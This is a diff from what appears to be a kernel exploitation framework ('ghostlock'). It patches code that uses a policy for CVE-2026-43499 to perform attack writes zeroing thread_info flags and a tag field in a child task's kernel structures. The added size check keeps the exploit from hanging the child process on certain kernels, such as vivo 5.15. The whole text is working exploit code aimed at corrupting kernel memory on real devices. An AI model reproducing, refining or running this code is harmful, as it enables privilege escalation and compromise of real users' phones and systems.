@@ -199,12 +199,26 @@ namespace ghostlock::session::backend {
                         child_task + kernel::TASK_THREAD_INFO_FLAGS_OFF, memory::WriteMode::Zero, 1);
                     vr_ok &= Cve2026_43499Policy::template attack_write<M>(session, flags_request, "VR: flags+tagA");
 
-                    /* 2) Clear tag B (64-bit aligned down). Belt-and-suspenders. */
-                    if (vr_ok) {
+                    /* 2) Clear tag B (64-bit aligned down). Belt-and-suspenders.
+                     * The tag must live inside thread_info. On kernels whose
+                     * thread_info is smaller than the aligned tag-B offset (vivo
+                     * 5.15: thread_info=40B, tag-B aligns to 0x28), the write
+                     * would land on task_struct.__state and permanently unwake
+                     * the blocked child, so skip it when the profile reports a
+                     * thread_info size that excludes the tag. Absent size keeps
+                     * the legacy behavior. */
+                    constexpr uintptr_t tagb_off = VR_TAG_B_OFF & ~7ULL;
+                    const uint32_t ti_sz = session.profile.thread_info_size();
+                    const bool tagb_valid =
+                            ti_sz == 0 || tagb_off + sizeof(uint64_t) <= ti_sz;
+                    if (vr_ok && tagb_valid) {
                         uintptr_t tagb_align = (child_task + VR_TAG_B_OFF) & ~7ULL;
                         const memory::WriteRequest tagb_request =
                                 memory::WriteRequest::make(tagb_align, memory::WriteMode::Zero, 1);
                         vr_ok &= Cve2026_43499Policy::template attack_write<M>(session, tagb_request, "VR: tagB");
+                    } else if (vr_ok) {
+                        pr_info("VR: tagB skipped (offset 0x%zx outside thread_info=%u)\n",
+                                tagb_off, ti_sz);
                     }
 
                     if (vr_ok) {
